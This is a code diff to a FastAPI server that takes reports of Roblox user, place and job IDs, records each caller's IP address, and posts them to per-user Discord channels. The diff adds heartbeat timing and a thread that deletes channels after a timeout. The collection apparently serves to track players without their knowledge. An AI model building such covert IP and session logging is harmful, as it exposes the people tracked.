@@ -1,4 +1,6 @@
 import os
+import time
+import threading
 import requests
 from typing import List, Dict
 from fastapi import FastAPI, Request, HTTPException, Depends
@@ -41,14 +43,16 @@ class Disconnect(BaseModel):
 
 @app.post("/info_report")
 async def info_report(info: Info, request: Request):
+    ip = request.client.host
+    existing = next((x for x in logs if x["userid"] == info.userid), None)
+    if not existing:
+        log = info.dict()
+        log["ip"] = ip
+        logs.append(log)
+    last_ping[info.userid] = time.time()
+
     if info.userid in user_channels:
         return {"detail": "Channel already exists"}
-
-    ip = request.client.host
-    log = info.dict()
-    log["ip"] = ip
-    logs.append(log)
-    last_ping[info.userid] = 0
 
     channel_payload = {
         "name": info.userid,
@@ -79,7 +83,9 @@ async def info_report(info: Info, request: Request):
             {"name": "Place ID", "value": info.placeid or "N/A", "inline": False},
             {"name": "Job ID", "value": info.jobid or "N/A", "inline": False}
         ],
-        "thumbnail": {"url": info.thumbnail if info.thumbnail.startswith("https://") else "https://tr.rbxcdn.com/default_thumbnail.png"}
+        "thumbnail": {
+            "url": info.thumbnail if info.thumbnail.startswith("https://") else "https://tr.rbxcdn.com/default_thumbnail.png"
+        }
     }
 
     message_payload = {
@@ -120,7 +126,7 @@ async def info_report(info: Info, request: Request):
 
 @app.post("/ping")
 async def ping_user(ping: Disconnect):
-    last_ping[ping.userid] = 0
+    last_ping[ping.userid] = time.time()
     return {"detail": "Ping OK"}
 
 
@@ -179,7 +185,9 @@ async def send_log(userid: str, creds: HTTPAuthorizationCredentials = Depends(se
                     {"name": "Place ID", "value": log["placeid"] or "N/A", "inline": False},
                     {"name": "Job ID", "value": log["jobid"] or "N/A", "inline": False}
                 ],
-                "thumbnail": {"url": log["thumbnail"] if log["thumbnail"].startswith("https://") else "https://tr.rbxcdn.com/default_thumbnail.png"}
+                "thumbnail": {
+                    "url": log["thumbnail"] if log["thumbnail"].startswith("https://") else "https://tr.rbxcdn.com/default_thumbnail.png"
+                }
             }
 
             message_payload = {
@@ -214,5 +222,27 @@ async def send_log(userid: str, creds: HTTPAuthorizationCredentials = Depends(se
             return {"detail": "Sent"}
     raise HTTPException(status_code=404, detail="Log not found")
 
+
+def monitor_disconnects():
+    while True:
+        time.sleep(30)
+        now = time.time()
+        for user_id, last in list(last_ping.items()):
+            if now - last > 60:
+                if user_id in user_channels:
+                    channel_id = user_channels[user_id]
+                    requests.post(
+                        f"https://discord.com/api/v10/channels/{channel_id}/messages",
+                        headers=headers,
+                        json={"content": "offline (auto timeout, deleting ts)"}
+                    )
+                    requests.delete(
+                        f"https://discord.com/api/v10/channels/{channel_id}",
+                        headers=headers
+                    )
+                    del user_channels[user_id]
+                    last_ping.pop(user_id, None)
+
+threading.Thread(target=monitor_disconnects, daemon=True).start()
 
 app.mount("/", StaticFiles(directory="dashboard", html=True), name="dashboard")
